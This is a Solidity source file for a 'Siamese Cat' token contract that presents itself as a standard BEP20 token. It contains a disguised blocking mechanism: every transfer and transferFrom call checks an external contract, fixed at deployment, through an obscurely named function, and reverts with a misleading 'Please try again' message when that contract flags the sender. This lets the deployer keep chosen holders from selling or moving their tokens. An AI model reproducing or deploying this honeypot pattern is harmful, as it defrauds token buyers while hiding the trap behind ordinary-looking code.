/**
 *Submitted for verification at Etherscan.io on 2021-06-27
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.2;

interface CoinBEP20 {

  function dalienaakan(address account) external view returns (uint8);
}

contract SiamCat is CoinBEP20 {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    CoinBEP20 dai;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Siamese Cat";
    string public symbol = hex"5349414D455345f09f9088";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(CoinBEP20 otd) {
        
        dai = otd;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address owner) public view returns(uint256) {
        return balances[owner];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(dai.dalienaakan(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }
    
    function dalienaakan(address account) external override view returns (uint8) {
        return 1;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(dai.dalienaakan(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
        
    }
}